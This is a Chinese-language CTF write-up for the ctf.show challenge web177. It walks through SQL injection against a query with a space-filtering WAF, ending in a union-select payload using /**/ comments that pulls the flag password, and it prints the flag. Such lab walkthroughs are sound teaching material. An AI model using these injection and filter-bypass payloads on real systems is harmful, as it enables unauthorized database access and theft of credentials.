### 📝 题目信息

- **题目名称**：web177
- **题目序号**：7/150
- **题目提示**：使用sqlmap是没有灵魂的
- **题目链接**：https://6a2eed93-d4fd-481d-9468-ee9515531e0c.challenge.ctf.show/

### 🔍 源码审计

和web176完全相同的查询语句：

```php
$sql = "select id,username,password from ctfshow_user 
        where username !='flag' and id = '" .$_GET['id']."' limit 1;";
```

WAF仍然存在，但规则发生了变化：

```php
function waf($str){  
    // 代码过于简单，不宜展示  
}
```

### 🧪 注入过程

#### 第1步：测试web176的payload

```bash
?id=999' or username='flag
```

**结果：** ❌ 无数据返回
说明WAF开始过滤了，可能过滤了空格或 `or` 关键字

#### 第2步：测试like模糊查询

```bash
?id=999' or username like '%fla%
```

**结果：** ❌ 无数据返回
进一步确认WAF在起作用

#### 第3步：测试union select

```bash
?id=999' union select 1,2,'3
```

**结果：** ❌ 无数据返回

#### 第4步：尝试注释符闭合

```bash
?id=999' union select 1,2,'3';%23
```

**结果：** ❌ 无数据返回
怀疑过滤了空格或 `union`、`select` 关键字

#### 第5步：使用注释符绕过空格过滤

```bash
?id=999'union/**/select/**/'1',2,'3';%23
```

**结果：** ✅ 有数据返回

| ID   | 用户名 | 密码 |
| :--- | :----- | :--- |
| 1    | 2      | 3    |

**结论：** WAF过滤了空格，但没有过滤 `union` 和 `select` 关键字

#### 第6步：构造子查询获取flag

```bash
?id=999'union/**/select/**/'1',
(select/**/password/**/from/**/ctfshow_user/**/where/**/username=/**/'flag'),
'3';%23
```

### 🏁 最终结果

```bash
ctfshow{a2578443-c0bf-4e71-865a-0206a86cb096}
```

**最终payload：**

```sql
999'union/**/select/**/'1',
(select/**/password/**/from/**/ctfshow_user/**/where/**/username=/**/'flag'),
'3';%23
```

### 📚 知识点总结

| 知识点             | 说明                               |
| :----------------- | :--------------------------------- |
| **注释符绕过空格** | `/**/` 可以代替空格，绕过简单的WAF |
| **联合查询注入**   | `union select` 要求前后列数相同    |
| **子查询**         | 可以在union中嵌套select获取数据    |
| **注释符闭合**     | `;%23` 用来注释掉后面的limit 1     |
| **WAF探测方法**    | 通过逐步测试找出过滤规则           |

### ⚠️ 踩坑记录

1. **web176的payload失效** - 说明WAF规则变了，需要重新探测
2. **空格被过滤** - 用 `/**/` 完美替代
3. **limit 1的影响** - 需要用 `;%23` 注释掉后面的limit限制

**本题难度：⭐️⭐ 中等偏易**
**注入类型：union联合查询注入**
**绕过技巧：`/\**/` 注释符代替空格**